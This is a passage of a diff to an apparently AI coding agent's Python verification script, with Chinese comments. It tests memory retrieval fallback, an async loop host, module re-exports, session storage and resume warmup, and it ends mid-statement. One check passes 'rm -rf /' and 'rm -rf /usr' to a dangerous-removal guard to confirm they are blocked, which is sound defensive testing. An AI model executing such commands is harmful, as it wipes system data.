+    # 与旧裸写法相同的 ID（proj#abc123 等），断言保持不变
+    index_text = (
+        "## 项目记忆\n"
+        "- [project] codeagent 压缩策略 (.memory/proj.jsonl#abc123): L4 分层压缩\n"
+        "- [user] 用户偏好中文回复 (.memory/user.jsonl#def456): 保姆语言\n"
+        "- [reference] gitee 仓库地址 (.memory/ref.jsonl#xyz789): https://gitee.com/x\n"
+    )
+    ids = keyword_fallback_ids("压缩策略 怎么配置", index_text, max_results=2)
+    if "proj#abc123" not in ids:
+        return _fail(f"关键词兜底没命中: {ids}")
+    ids2 = keyword_fallback_ids(
+        "压缩策略", index_text, exclude_ids={"proj#abc123"},
+    )
+    if "proj#abc123" in ids2:
+        return _fail("exclude_ids 没生效")
+    # ID 纠错：LLM 抄掉尾部两位也能救回
+    fixed = correct_memory_id("proj#abc1", index_text)
+    if fixed != "proj#abc123":
+        return _fail(f"前缀纠错失败: {fixed}")
+    fixed2 = correct_memory_id("PROJ#ABC123", index_text)
+    if fixed2 != "proj#abc123":
+        return _fail(f"大小写归一纠错失败: {fixed2}")
+    if correct_memory_id("totally#nope", index_text) is not None:
+        return _fail("救不回的 ID 应返回 None")
+    # 真实索引行是 markdown 链接（.memory/{topic}.jsonl#{uid}，见
+    # memory_store._entry_link），兜底必须抠出裸 {topic}#{uid}——
+    # retrieve_relevant 的返回值和 MemoryStore.get() 认的都是裸 ID
+    real_index = (
+        "- [project] codeagent 压缩策略 (.memory/project.jsonl#abc123): L4 分层压缩 [age: 3d]\n"
+        "- [reference] gitee 地址 (.memory/projects/x/reference.jsonl#xyz789): url [age: 5d]\n"
+    )
+    rids = keyword_fallback_ids("压缩策略", real_index)
+    if rids[:1] != ["project#abc123"]:
+        return _fail(f"真实链接格式没抠出裸 ID: {rids}")
+    fixed3 = correct_memory_id("reference#xyz78", real_index)
+    if fixed3 != "reference#xyz789":
+        return _fail(f"真实链接格式前缀纠错失败: {fixed3}")
+    # 中文 2-gram 兜底：整句中文（无空格）能拆出子词命中索引行
+    from agent import memory_retriever as mr
+    toks = mr._query_tokens("怎么配置缓存")
+    if "缓存" not in toks or "配置" not in toks:
+        return _fail(f"中文兜底没出 2-gram: {toks[:8]}")
+    # 假 ID 不误配：索引行正文里 (v2#dev) 不该被当记忆 ID
+    line = "- [某条](.memory/general.jsonl#abc123) — 说明 (v2#dev) 备注"
+    ids = mr._ID_IN_LINE.findall(line)
+    if ("v2#dev") in ids or not any("abc123" in i for i in ids):
+        return _fail(f"ID 正则误配: {ids}")
+    return _ok("关键词兜底 + ID 纠错正常")
+
+
+def check_memory_injection_wiring():
+    """验证注入链兜底接线：LLM 空手→关键词顶上；抄错 ID→纠错救回；计数器工作。"""
+    import asyncio as _aio
+    from agent import memory_injection as mi
+
+    class _FakeStore:
+        def full_index_text_with_age(self):
+            # 链接格式（真实索引长相）——裁剪后还原出 proj#abc123 裸 ID
+            return (
+                "- [project] codeagent 压缩策略 (.memory/proj.jsonl#abc123): L4 分层压缩\n"
+                "- [user] 用户偏好 (.memory/user.jsonl#def456): 中文回复\n"
+            )
+
+        def get(self, mid):
+            if mid == "proj#abc123":
+                return SimpleNamespace(
+                    type="project", name="压缩策略", body="L4 分层压缩",
+                    updated_at=None,
+                )
+            return None
+
+    class _DeadLLM:
+        async def chat_completions(self, *a, **kw):
+            raise RuntimeError("aux LLM 挂了")
+
+    mi.reset_injection_cache()
+    before = dict(mi._retrieval_stats)
+    # query 带空格照常可分；无空格的连续中文现在靠 2-gram 兜底
+    # （见 check_memory_retrieval_fallback 的 2-gram 断言）
+    msg = _aio.run(mi.build_relevant_memories_message(
+        query="压缩策略 怎么配置",
+        memory_store=_FakeStore(),
+        aux_llm_router=_DeadLLM(),
+        max_results=3,
+        surfaced=set(),
+    ))
+    if msg is None:
+        return _fail("LLM 挂了+兜底在场时不该返回 None")
+    if "proj#abc123" not in msg["content"] and "压缩策略" not in msg["content"]:
+        return _fail(f"兜底没把相关记忆注入: {str(msg)[:150]!r}")
+    after = mi._retrieval_stats
+    if after["requests"] <= before["requests"]:
+        return _fail("遥测计数没涨")
+    return _ok(f"兜底接线+遥测正常（requests={after['requests']}）")
+
+
+def check_pre_send_guard():
+    """验证发送前预检判定：混合估算超窗口 90% 才要求再压一次。"""
+    from agent.context_pipeline import needs_pre_send_compaction
+    big = [{"role": "user", "content": "汉" * 200000}]  # ≈20 万 token
+    if not needs_pre_send_compaction(big, None, "deepseek-chat"):
+        return _fail("64k 窗口 + 20 万 token 应触发预检")
+    small = [{"role": "user", "content": "你好"}]
+    if needs_pre_send_compaction(small, None, "deepseek-chat"):
+        return _fail("小上下文不该触发预检")
+    # 1M 窗口下 20 万 token 不触发
+    if needs_pre_send_compaction(big, None, "claude-x[1m]"):
+        return _fail("1M 窗口 + 20 万 token 不该触发")
+    # 坏锚点不炸（fail-open 全量估算）
+    if not needs_pre_send_compaction(big, ("x", "y"), "deepseek-chat"):
+        return _fail("坏锚点应回退全量估算并触发")
+    return _ok("发送前预检判定正常")
+
+
+def check_loop_host():
+    """验证事件循环宿主十件套：run_async 阻塞等结果且跑在宿主循环上、
+    异常穿透、submit 后台任务执行、run_turn 栅栏取消回合遗留 task、
+    submit 豁免不被栅栏误杀、submit 出生即豁免（pending 集）防栅栏竞态误杀、
+    run_async(exempt_from_fence=True) 跨回合长活不被栅栏误杀、
+    submit 的 contextvars 从调用方线程传播进后台任务（create_task(context=)）、
+    run_async 超时抛 TimeoutError 且协程被取消、stop 后拒绝复活
+    （run_async 抛 RuntimeError，submit 返回已设异常的 future）。"""
+    import asyncio
+    from agent.loop_host import loop_host, cancel_current_turn
+
+    where = {}
+    async def _coro():
+        where["loop"] = asyncio.get_running_loop()
+        return 42
+    if loop_host.run_async(_coro()) != 42:
+        return _fail("run_async 结果不对")
+    if where.get("loop") is not loop_host.loop:
+        return _fail("协程没跑在宿主循环上")
+
+    async def _boom():
+        raise ValueError("boom")
+    try:
+        loop_host.run_async(_boom())
+        return _fail("异常没穿透")
+    except ValueError:
+        pass
+
+    done = {}
+    async def _bg():
+        done["yes"] = True
+    loop_host.submit(_bg(), name="verify").result(timeout=5)
+    if not done.get("yes"):
+        return _fail("submit 没执行")
+
+    # 栅栏：回合内裸 create_task 的遗留被取消
+    fate = {}
+    async def _leaked():
+        try:
+            await asyncio.sleep(30)
+            fate["leaked"] = "done"
+        except asyncio.CancelledError:
+            fate["leaked"] = "cancelled"
+    async def _turn():
+        asyncio.ensure_future(_leaked())
+        await asyncio.sleep(0.05)
+        return "ok"
+    if loop_host.run_turn(_turn()) != "ok":
+        return _fail("run_turn 结果不对")
+    if fate.get("leaked") != "cancelled":
+        return _fail(f"栅栏没取消遗留任务: {fate}")
+
+    # 豁免：submit 的慢后台任务在另一回合栅栏后仍活着
+    bg_alive = {}
+    async def _slow_bg():
+        try:
+            await asyncio.sleep(0.3)
+            bg_alive["ok"] = True
+        except asyncio.CancelledError:
+            bg_alive["cancelled"] = True
+    bgfut = loop_host.submit(_slow_bg(), name="verify-slow")
+    async def _turn2():
+        await asyncio.sleep(0.05)
+        return "ok2"
+    loop_host.run_turn(_turn2())
+    bgfut.result(timeout=5)
+    if bg_alive.get("cancelled"):
+        return _fail("submit 的后台任务被回合栅栏误杀")
+
+    # C-1 竞态用例（确定性复现）：回合挂起等事件期间排两个回调——
+    # ①唤醒回调（让回合的最后一步入队）②submit 的建任务回调（后台
+    # task 创建、首步排在回合收尾之后）。栅栏落下时后台 task「已创建
+    # 未启动」：注册进 _bg_tasks 要等首步跑，此刻还没轮到——没有
+    # pending 豁免集时它会被栅栏静默取消（协程体一行不跑、WARNING
+    # 都不打）。两个回调都从回合协程内发起，入队顺序在循环线程上
+    # 百分百确定（唤醒先、submit 后，否则首步会先于回合收尾执行）。
+    c1_fate = {}
+    c1_holder = []
+    async def _c1_bg():
+        try:
+            await asyncio.sleep(0.2)
+            c1_fate["r"] = "done"
+        except asyncio.CancelledError:
+            c1_fate["r"] = "cancelled"
+    async def _c1_turn():
+        ev = asyncio.Event()
+        loop_host.call_soon_threadsafe(ev.set)  # ① 唤醒回调先入队
+        c1_holder.append(loop_host.submit(_c1_bg(), name="verify-c1"))  # ② 建任务回调紧随
+        await ev.wait()  # 回合挂起；唤醒后的下一步就是收尾（栅栏落下）
+        return "ok3"
+    if loop_host.run_turn(_c1_turn()) != "ok3":
+        return _fail("C-1 用例回合结果不对")
+    try:
+        c1_holder[0].result(timeout=5)
+    except BaseException:
+        pass  # 未修复时后台任务出生即被栅栏取消，future 以 CancelledError 收场
+    if c1_fate.get("r") == "cancelled":
+        return _fail("C-1 竞态复现：已创建未启动的后台任务被栅栏误杀")
+    if c1_fate.get("r") != "done":
+        return _fail(f"C-1 竞态复现：后台任务没跑完（出生即被栅栏取消）: {c1_fate}")
+
+    # cancel_current_turn 空转不炸（没有回合在跑）
+    cancel_current_turn()
+
+    # 豁免回归：exempt_from_fence 的 run_async 长活不被回合栅栏杀——
+    # 后台线程发起、活过一次回合栅栏（0.25s 长活 vs 0.08s 短回合），
+    # 修好前它会被栅栏当回合遗留取消（CancelledError 还是 BaseException，
+    # 会穿透调用方全部 except Exception fail-open 防线）。
+    # 时序确定性：runner 线程先等 _turn3 开门再提交——开门发生在栅栏
+    # before 快照之后（同一同步段内），长活铁定「生于回合期间」，既不在
+    # before 也不在 _bg_tasks，只靠 pending 豁免集活命（不握手的话线程
+    # 可能抢在快照前提交，测试退化为无条件通过、测不到栅栏）
+    ex_fate = {}
+    async def _ex_long():
+        try:
+            await asyncio.sleep(0.25)
+            ex_fate["r"] = "done"
+        except asyncio.CancelledError:
+            ex_fate["r"] = "cancelled"
+    import threading as _th2
+    _box = {}
+    _gate = _th2.Event()
+    def _runner():
+        _gate.wait(timeout=5)  # 等回合真正开跑（快照已拍）再提交
+        _box["r"] = loop_host.run_async(_ex_long(), exempt_from_fence=True)
+    _t2 = _th2.Thread(target=_runner, daemon=True)
+    _t2.start()
+    async def _turn3():
+        _gate.set()  # 开门：runner 此刻提交的长活必然生于快照之后
+        await asyncio.sleep(0.08)
+        return "ok4"
+    if loop_host.run_turn(_turn3()) != "ok4":
+        return _fail("exempt 用例回合结果不对")
+    _t2.join(timeout=5)
+    if ex_fate.get("r") == "cancelled":
+        return _fail("exempt 的 run_async 被回合栅栏误杀")
+    if ex_fate.get("r") != "done" or _box.get("r") is not None:
+        return _fail(f"exempt 长活未跑完: {ex_fate} {_box}")
+
+    # 第八件（I-1 传播断言）：submit 的后台任务要读到调用方线程 set 的
+    # ContextVar。修好前 Task 拷的是宿主循环线程的上下文（协程对象不
+    # 绑定 context，ctx.run 白做），调用方 set 的变量全丢——worktree
+    # 会话的后台记忆提取会拿到主进程目录、写错项目分区
+    import contextvars as _cv
+    _probe_var = _cv.ContextVar("verify_loop_host_probe", default="unset")
+    _got = {}
+    async def _ctx_bg():
+        _got["v"] = _probe_var.get()
+    def _setter_thread():
+        _probe_var.set("from-caller")
+        loop_host.submit(_ctx_bg(), name="verify-ctx").result(timeout=5)
+    _ct = _th2.Thread(target=_setter_thread, daemon=True)
+    _ct.start(); _ct.join(timeout=5)
+    if _got.get("v") != "from-caller":
+        return _fail(f"contextvars 没传播到后台任务: {_got}")
+
+    # 第九件（timeout 取消语义）：run_async 超时抛 TimeoutError 且协程
+    # 真被取消——不然调用方都超时走了，协程还赖在常驻循环上白跑到天荒地老
+    t_fate = {}
+    async def _t_long():
+        try:
+            await asyncio.sleep(5)
+            t_fate["r"] = "done"
+        except asyncio.CancelledError:
+            t_fate["r"] = "cancelled"
+    try:
+        loop_host.run_async(_t_long(), timeout=0.1)
+        return _fail("timeout 没抛 TimeoutError")
+    except TimeoutError:
+        pass
+    import time
+    _t0 = time.monotonic()
+    while t_fate.get("r") is None and time.monotonic() - _t0 < 2:
+        time.sleep(0.02)
+    if t_fate.get("r") != "cancelled":
+        return _fail(f"timeout 后协程没被取消: {t_fate}")
+
+    # 第十件（stop 拒绝复活）：stop 后 straggler 线程再来调 run_async/submit
+    # 必须被拒——旧版会悄悄拉起一个新循环（用独立实例验证，不碰全局单例）
+    from agent.loop_host import AgentLoopHost
+    h2 = AgentLoopHost()
+    async def _smoke():
+        return 1
+    if h2.run_async(_smoke()) != 1:
+        return _fail("独立实例基础语义坏了")
+    h2.stop()
+    # 两条被拒协程先建对象再交，被拒分支里 close 掉——不然协程没人
+    # await，GC 时打 "never awaited" RuntimeWarning 噪音
+    _rej1 = _smoke()
+    try:
+        h2.run_async(_rej1)
+        return _fail("stop 后 run_async 没拒绝")
+    except RuntimeError:
+        _rej1.close()
+    _rej2 = _smoke()
+    bgf = h2.submit(_rej2, name="verify-stopped")
+    try:
+        bgf.result(timeout=2)
+        return _fail("stop 后 submit 的 future 不该成功")
+    except RuntimeError:
+        # submit 被拒时协程没被排上（_ensure_started 先炸），close 安全
+        _rej2.close()
+    return _ok("loop_host 语义十件套正常（含 timeout 取消与 stop 拒绝）")
+
+
+def check_split_symbol_surface():
+    """验证拆分后符号面不缩：agent root 的旧符号照常可用，新模块独立可导。"""
+    import agent
+    from agent import AIAgent, _spawn_detached, LoopExitReason, _drop_leading_system
+    from agent import (
+        _build_goal_continue_message, _build_channel_injection, _build_mail_injection,
+    )
+    import agent.ephemeral_inject as ei
+    if ei.LoopExitReason is not LoopExitReason:
+        return _fail("LoopExitReason 双导不一致")
+    if not callable(_spawn_detached):
+        return _fail("_spawn_detached 丢了")
+    # 五个新拆模块全部可独立 import（turn_observer 借助模块级 hoist 由
+    # import agent 传递覆盖，这里显式断言防退回惰性）
+    import agent.ephemeral_inject  # noqa: F401
+    import agent.tool_batch_summary  # noqa: F401
+    import agent.usage_accounting  # noqa: F401
+    import agent.skill_learning.turn_observer  # noqa: F401
+    from agent.reflection import trigger_reflection_async as _tra
+    if not callable(_tra):
+        return _fail("trigger_reflection_async 不可用")
+    # 拆分二期块 A：llm_retry 的五个新自由函数（max_tokens 升级/续写恢复
+    # 四件 + 长退避心跳），agent root 模块级引入防退回惰性
+    from agent.llm_retry import (
+        try_escalate_max_tokens, merge_usage_tokens,
+        recover_output_truncation, merge_continuation_response,
+        llm_retry_heartbeat,
+    )
+    if not all(callable(f) for f in (
+        try_escalate_max_tokens, merge_usage_tokens,
+        recover_output_truncation, merge_continuation_response,
+        llm_retry_heartbeat,
+    )):
+        return _fail("块 A 五自由函数有不可调用者")
+    # 拆分二期块 B：流式调用心脏（call_llm_streaming + 墓碑清理）拆到
+    # llm_streaming，agent root 模块级引入防退回惰性
+    import agent.llm_streaming  # noqa: F401
+    from agent.llm_streaming import (
+        call_llm_streaming, discard_partial_stream_state,
+    )
+    if not all(callable(f) for f in (
+        call_llm_streaming, discard_partial_stream_state,
+    )):
+        return _fail("块 B 二自由函数有不可调用者")
+
+    # 拆分三期：delegate 系列模块可独立 import 且主文件 re-export 生效
+    import tools.delegate_result  # noqa: F401
+    import tools.delegate_setup  # noqa: F401 —— T2 落地：配置纯函数三件
+    # re-export 一致性走跨模块比对（源模块定义 vs 主文件 re-export 必须同一对象）——
+    # 旧写法 from delegate_tool import 之后再跟 delegate_tool 比是自己比自己（恒真）
+    import tools.delegate_result as _dr
+    import tools.delegate_setup as _ds
+    import tools.delegate_tool as _dt
+    if _dr._offload_child_result is not _dt._offload_child_result:
+        return _fail("delegate_result._offload_child_result 与主文件 re-export 不是同一对象")
+    for _fn in ("inline_mcp_spawn_allowed", "_validate_toolset_names",
+                "_delegate_schema_overrides"):
+        if not callable(getattr(_ds, _fn, None)) \
+                or getattr(_ds, _fn) is not getattr(_dt, _fn, None):
+            return _fail(f"delegate_setup.{_fn} 与主文件 re-export 不是同一对象")
+    # 拆分三期 T3：kill 工具簇三件（schema 是 dict 走同对象比对，两个 fn
+    # 加 callable 断言）——跨模块比对风格与 T2 一致
+    import tools.delegate_kill  # noqa: F401 —— T3 落地：kill 工具簇三件
+    import tools.delegate_kill as _dk
+    if _dk.SUBAGENT_KILL_SCHEMA is not getattr(_dt, "SUBAGENT_KILL_SCHEMA", None):
+        return _fail("delegate_kill.SUBAGENT_KILL_SCHEMA 与主文件 re-export 不是同一对象")
+    for _fn in ("_handle_subagent_kill", "_subagent_kill_check_fn"):
+        if not callable(getattr(_dk, _fn, None)) \
+                or getattr(_dk, _fn) is not getattr(_dt, _fn, None):
+            return _fail(f"delegate_kill.{_fn} 与主文件 re-export 不是同一对象")
+    # 拆分三期 T4：_run_child 巨无霸拆到 delegate_child——三条链调用点、外部
+    # 延迟 import（hook_exec/workflow_engine/plan_mode_tool）与本文件的
+    # patch("tools.delegate_tool._run_child") 都解析主文件全局名，同一对象
+    # 断言保证 re-export 生效（patch 契约不破）——风格与 T2/T3 一致
+    import tools.delegate_child  # noqa: F401 —— T4 落地：子代理执行心脏
+    import tools.delegate_child as _dc
+    if not callable(getattr(_dc, "_run_child", None)) \
+            or _dc._run_child is not getattr(_dt, "_run_child", None):
+        return _fail("delegate_child._run_child 与主文件 re-export 不是同一对象")
+    # 拆分三期第二块：permission 四模块
+    import agent.readonly_commands as _rc
+    import agent.permission as _perm
+    # 源侧 getattr 兜底：缺名时干净 _fail，不裸 AttributeError
+    if getattr(_rc, "is_readonly_command", None) is not getattr(_perm, "is_readonly_command", None):
+        return _fail("readonly_commands re-export 断链")
+    # 拆分三期第二块 T2：LLM 分类辅助拆到 permission_llm——类内 _check_llm_classifier
+    # （热区，留在类内）消费的 5 个符号全走主文件 re-export，跨模块同一对象比对
+    # （源模块定义 vs 主文件 re-export 必须同一对象），风格与 delegate T2/T3 一致
+    import agent.permission_llm as _plm
+    for _name in ("_classify_bash_command", "LLM_DENIAL_MAX_CONSECUTIVE",
+                  "LLM_DENIAL_MAX_TOTAL", "_is_dangerous_whitelist_entry",
+                  "_matches_whitelist"):
+        if getattr(_plm, _name, None) is not getattr(_perm, _name, None):
+            return _fail(f"permission_llm.{_name} 与主文件 re-export 不是同一对象")
+    # 拆分三期第二块 T3：路径安全簇（簇 C）拆到 path_guard——safe_path 的两处
+    # 外部模块级 import（tools/file_operations、tools/glob_tool）与 check_path
+    # 类方法调用点全走主文件 re-export；_EXTRA_ALLOWED_ROOTS 随簇走自包含。
+    # 比对扩成簇内全部 9 个 re-export 符号（safe_path/三个 is、check 形态检查/
+    # 白名单四件 + 默认根），全函数走 callable 分流（无常量成员），源侧
+    # getattr 兜底：缺名干净 _fail，不裸 AttributeError
+    import agent.path_guard as _pg
+    for _name in ("safe_path", "is_protected_path", "is_write_protected_path",
+                  "check_suspicious_path", "add_extra_allowed_root",
+                  "list_extra_allowed_roots", "remove_extra_allowed_root",
+                  "clear_extra_allowed_roots", "default_allowed_roots"):
+        _src_obj = getattr(_pg, _name, None)
+        if not callable(_src_obj) \
+                or _src_obj is not getattr(_perm, _name, None):
+            return _fail(f"path_guard.{_name} 与主文件 re-export 不是同一对象")
+    # 拆分三期第二块 T4：危险删除与 cd+git 防护（簇 F）拆到 bash_removal_guard
+    # ——check() 三处调用点（危险删除/段数上限闸门/cd+git 组合）全走主文件
+    # re-export；_CMD_SEGMENT_SPLIT_RE 与 _MAX_COMPOUND_SEGMENTS 是段数上限
+    # 闸门直接引用的数据符号（非 callable，走纯同对象比对）。风格与 T2/T3 一致
+    import agent.bash_removal_guard as _brg
+    for _name in ("check_dangerous_removal", "is_dangerous_removal_path",
+                  "_has_cd_git_combo"):
+        if not callable(getattr(_brg, _name, None)) \
+                or getattr(_brg, _name, None) is not getattr(_perm, _name, None):
+            return _fail(f"bash_removal_guard.{_name} 与主文件 re-export 不是同一对象")
+    for _name in ("_CMD_SEGMENT_SPLIT_RE", "_MAX_COMPOUND_SEGMENTS"):
+        if getattr(_brg, _name, None) is not getattr(_perm, _name, None):
+            return _fail(f"bash_removal_guard.{_name} 与主文件 re-export 不是同一对象")
+    # WS transport 不再自建循环（set_event_loop 会污染调用线程的循环视图）
+    import inspect
+    import agent.mcp_client as _mc
+    _src = inspect.getsource(_mc)
+    if "set_event_loop" in _src or "new_event_loop" in _src:
+        return _fail("mcp_client 仍有自建事件循环残留")
+    if "loop_host.run_async" not in _src:
+        return _fail("WS transport 没走 loop_host")
+    # 主循环 on_pre_compress 快照语义的结构守卫（行为断言在 warmup 侧，
+    # 这里防主循环侧快照被误删——仿 R10 结构守卫手法）
+    import agent as _agent_mod
+    if "pre_compress_msgs = [dict(m) for m in messages]" not in inspect.getsource(_agent_mod):
+        return _fail("主循环 pre_compress_msgs 快照丢失")
+    return _ok("拆分符号面契约成立")
+
+
+def check_root_path_removal():
+    """验证裸 / 删除目标被危险删除闸门拦截（R14 终审发现的基线 bug）。
+
+    旧 _CMD_FLAG_RE 的 ^/[A-Za-z]?$ 分支把裸 /（0 字母）当 Windows
+    斜杠选项跳过——rm -rf / 在本层漏拦（只剩闸门 0 兜底）。
+    """
+    from agent.bash_removal_guard import check_dangerous_removal
+    r = check_dangerous_removal("rm -rf /")
+    if r is None:
+        return _fail("裸 / 删除目标被当选项跳过（本层漏拦）")
+    if check_dangerous_removal("rm -rf /usr") is None:
+        return _fail("/usr 单级根子路径该拦")
+    # Windows 单字母选项仍跳过（/s /q）——不误伤正常用法
+    if check_dangerous_removal("del /s something.tmp", cwd="D:/tmp") is not None:
+        return _fail("del /s 的 /s 选项被误拦（选项语义回归）")
+    return _ok("裸 / 拦截 + 选项跳过边界正常")
+
+
+def check_anthropic_usage_fields():
+    """验证 Anthropic 响应包装后的 usage 带 cache 字段（缓存记账/锚点口径依赖）。"""
+    from types import SimpleNamespace as NS
+    from agent.llm_client import AnthropicClient
+    fake = NS(
+        content=[NS(type="text", text="hi")],
+        usage=NS(input_tokens=10, output_tokens=5,
+                 cache_read_input_tokens=7, cache_creation_input_tokens=3),
+    )
+    client = AnthropicClient.__new__(AnthropicClient)  # 不跑 __init__（不碰网络）
+    wrapped = client._wrap_response(fake)
+    u = wrapped.usage
+    if getattr(u, "cache_read_input_tokens", None) != 7:
+        return _fail(f"cache_read_input_tokens 丢失: {u}")
+    if getattr(u, "cache_creation_input_tokens", None) != 3:
+        return _fail(f"cache_creation_input_tokens 丢失: {u}")
+    return _ok("Anthropic usage 缓存字段齐全")
+
+
+def check_session_append_perf(tmp):
+    """验证 append 不再 O(n²)：连写 200 条 turn_index 连续正确、文件行数
+    吻合、index 卡片去抖中途真的延迟、flush 后最终一致。"""
+    import json as _j
+    from agent.session_store import SessionStore
+    store = SessionStore(tmp / "perf_sessions")
+    sid = store.create_session(title="perf", model="t")
+    # 去抖延迟断言：另开一个会话连写 3 条，磁盘卡片应停在首条 flush 的
+    # 状态（首条触发 _index_last_flush=0.0 的立即写盘，之后 3 条在窗口内
+    # 只进内存）——若实现退化为每条都写盘，这里会 FAIL
+    sid_d = store.create_session(title="debounce", model="t")
+    for i in range(3):
+        store.append_message(sid_d, "user", f"d{i}")
+    disk_d = _j.loads((tmp / "perf_sessions" / "index.json").read_text(encoding="utf-8"))
+    entry_d = next(s for s in disk_d["sessions"] if s["id"] == sid_d)
+    if entry_d.get("message_count") != 1:
+        return _fail(f"去抖没延迟：3 条后磁盘计数应为 1（首条 flush），实际 {entry_d.get('message_count')}")
+    # 交替 user/assistant 各 100 条：user 各开新轮
+    for i in range(100):
+        store.append_message(sid, "user", f"问{i}")
+        store.append_message(sid, "assistant", f"答{i}")
+    msgs = store._read_session_msgs(sid)
+    if len(msgs) != 200:
+        return _fail(f"行数不符: {len(msgs)}")
+    turns = [m.get("turn_index") for m in msgs]
+    # 第 1 条 user 是第 1 轮；第 i 对 user 是第 i 轮，同轮 assistant 沿用
+    if turns[0] != 1 or turns[1] != 1 or turns[198] != 100 or turns[199] != 100:
+        return _fail(f"turn_index 序列不对: {turns[:4]}...{turns[-4:]}")
+    # 去抖：磁盘卡片允许落后，但 flush 后必须追平
+    store.flush_index()
+    disk = _j.loads((tmp / "perf_sessions" / "index.json").read_text(encoding="utf-8"))
+    entry = next(s for s in disk["sessions"] if s["id"] == sid)
+    if entry.get("message_count") != 200:
+        return _fail(f"flush 后磁盘卡片计数不追平: {entry.get('message_count')}")
+    # 二次实例（模拟重启）从磁盘引导 turn_index：接着写 user 应开 101 轮
+    store2 = SessionStore(tmp / "perf_sessions")
+    tid = store2.append_message(sid, "user", "重启后再问")
+    m2 = store2._read_session_msgs(sid)[-1]
+    if m2.get("turn_index") != 101:
+        return _fail(f"重启引导 turn_index 不对: {m2.get('turn_index')}")
+    return _ok("append 线性化 + 卡片去抖 + 重启引导全正常")
+
+
+def check_session_field_passthrough(tmp):
+    """验证 pinned/timestamp 落库往返：append 带参 → get_messages 带回（timestamp 再与 JSONL 原文逐字符对比保真）。"""
+    from agent.session_store import SessionStore
+    store = SessionStore(tmp / "passthrough")
+    sid = store.create_session(title="pt", model="t")
+    store.append_message(sid, "user", "钉住这条", pinned=True)
+    store.append_message(sid, "assistant", "普通回复")
+    msgs = store.get_messages(sid)
+    if msgs[0].get("pinned") is not True:
+        return _fail(f"pinned 没往返: {msgs[0]}")
+    if not msgs[0].get("timestamp"):
+        return _fail(f"timestamp 没透传: {msgs[0]}")
+    if "pinned" in msgs[1]:
+        return _fail(f"未钉住的消息不该带 pinned: {msgs[1]}")
+    # timestamp 保真：透传的是原值不是重新生成——解析回 epoch 还比
+    # 2023-11-14 早的话只可能是糊弄值（store 在自己 new 一个假时间）
+    from datetime import datetime as _dt
+    if _dt.fromisoformat(msgs[0]["timestamp"]).timestamp() < 1_700_000_000:
+        return _fail("timestamp 不是真实时间")
+    # 显式 False 往返（契约形状：False 落库透传，与缺键区分——缺键是
+    # 「没说过钉不钉」的老行形状，False 是「明确说了不钉」，语义不能混）
+    sid2 = store.create_session(title="f", model="t")
+    store.append_message(sid2, "user", "x", pinned=False)
+    m3 = store.get_messages(sid2)[-1]  # 取末行与原文锚定对齐，未来追加免疫
+    if m3.get("pinned") is not False:
+        return _fail(f"显式 pinned=False 没往返: {m3}")
+    # 精确往返：直接读 sid2 会话 .jsonl 原文的最后一行，拿它的 timestamp
+    # 与 get_messages 透传值逐字符对比——透传链任何一环重新生成/改写
+    # 都抓得住（上面的 fromisoformat 断言只防 2023 年前的糊弄值，
+    # now() 重生成出来的新鲜时间它根本抓不住）。m3 取 [-1] 与原文末行
+    # 同锚，未来往会话追加新行对比也不脱锚。
+    raw_last = json.loads(
+        (tmp / "passthrough" / f"{sid2}.jsonl")
+        .read_text(encoding="utf-8").strip().splitlines()[-1])
+    if raw_last.get("timestamp") != m3.get("timestamp"):
+        return _fail("timestamp 透传不保真：JSONL 原文与 get_messages 不一致")
+    return _ok("pinned/timestamp 往返正常（含真实时刻 + 显式 False + 原文精确对比）")
+
+
+def check_resume_warmup(tmp):
+    """验证 resume 预热：_timestamp 盖回 + 大结果落盘占位 + timestamp/pinned 剥离。
+
+    伪造一份 store 会话（大工具结果 + pinned 消息），走 get_messages →
+    cli 的 _resume_warmup（假 rt，llm_client=None 只验无损层不烧 LLM），
+    断言三件事：
+    1) store 的 ISO timestamp 盖回内存的 _timestamp（float——时间清理层
+       跨重启复活的前提）；
+    2) 大工具结果被无损层落盘折成占位（full_at 找回指针在场——压缩
+       前移到恢复时，首轮不再慢慢吞吞中途才压）；
+    3) timestamp/pinned 两个键从消息上剥掉（strip_internal_fields 是
+       黑名单制只认 _ 前缀键，这两个非下划线键它剥不掉，带进 LLM
+       请求体在严格的 OpenAI 兼容端可能 400）。附带验证开关关闭 =
+       只盖时间戳不跑压缩。
+    """
+    from agent.session_store import SessionStore
+    from agent.context_pipeline import reset_offload_decisions
+    import cli as _cli
+
+    # 冻结决策表是模块级全局（跨检查共享），先清空保证本检查从零开始
+    # （别的检查若碰巧用过 w0..w7 这类 id，照抄旧预览会搅乱断言）
+    reset_offload_decisions()
+    store = SessionStore(tmp / "warmup_sessions")
+    sid = store.create_session()
+    store.append_message(sid, "user", "go")
+    for i in range(8):
+        store.append_message(
+            sid, "assistant", "",
+            tool_calls=[{"id": f"w{i}", "type": "function",
+                         "function": {"name": "t", "arguments": "{}"}}])
+        store.append_message(sid, "tool", "X" * 5000,
+                             tool_call_id=f"w{i}", name="t")
+    store.append_message(sid, "assistant", "done", pinned=True)
+
+    msgs = store.get_messages(sid)
+    conv = [m for m in msgs if m.get("role") != "system"]
+    if not conv or not conv[0].get("timestamp"):
+        return _fail(f"store 没透传 timestamp（前置条件已坏）: {conv[0] if conv else None}")
+
+    rt = SimpleNamespace(
+        config={"context": {
+            "resume_warmup_enabled": True,
+            "output_offload_threshold": 1000,   # 低阈值：5000 字符大结果必落盘
+        }},
+        agent=SimpleNamespace(llm_client=None, model="verify-model"),
+        home=tmp,
+        session_id=sid,
+        session_store=store,
+    )
+    out = _cli._resume_warmup(rt, conv)
+
+    # 断言 1：_timestamp 盖回（float 且为正数；首条 user 与末条 assistant 都验）
+    for probe in (out[0], out[-1]):
+        ts = probe.get("_timestamp")
+        if not isinstance(ts, float) or ts <= 0:
+            return _fail(f"_timestamp 没盖回（时间清理层仍哑）: {probe}")
+
+    # 断言 2：大工具结果落盘折成占位（≥1 占位即证明无损层跑过——L2 折叠
+    # 有头尾保留，凑不满 5 是正常）
+    n_placeholder = sum(
+        1 for m in out
+        if m.get("role") == "tool" and "full_at" in str(m.get("content", ""))
+    )
+    if n_placeholder < 1:
+        return _fail("大工具结果没被落盘折占位（无损层没前移到恢复时）")
+
+    # 断言 3：timestamp/pinned 已剥 + system 占位没混进对话历史
+    leaked = [m for m in out if "timestamp" in m or "pinned" in m]
+    if leaked:
+        return _fail(f"timestamp/pinned 没剥掉（会带进 LLM 请求体）: {leaked[0]}")
+    if out and out[0].get("role") == "system":
+        return _fail("system 占位混进了对话历史")
+
+    # 开关关闭路径：只盖时间戳不跑压缩（大结果保持原文、键照样剥）
+    rt_off = SimpleNamespace(
